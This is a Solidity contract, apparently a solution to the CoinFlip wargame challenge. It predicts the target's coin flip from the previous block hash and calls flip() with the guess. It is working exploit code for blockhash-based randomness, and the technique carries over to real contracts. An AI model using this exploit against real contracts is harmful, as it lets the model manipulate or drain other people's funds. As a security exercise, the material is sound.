// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

import "forge-std/console.sol";

contract CoinFlipAttack {
    address private owner;
    address private targetAddress;
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _targetAddress) {
        owner = msg.sender;
        targetAddress = _targetAddress;
    }

    function attack() external {
        require(msg.sender == owner, "who are you?");

        uint256 blockValue = uint256(blockhash(block.number - 1));
        bool predict = false;
        
        if (blockValue / FACTOR == 1) {
            predict = true;
        }

        (bool success,) = targetAddress.call(abi.encodeWithSignature("flip(bool)", predict));
        require(success, "call failed");
    }
}
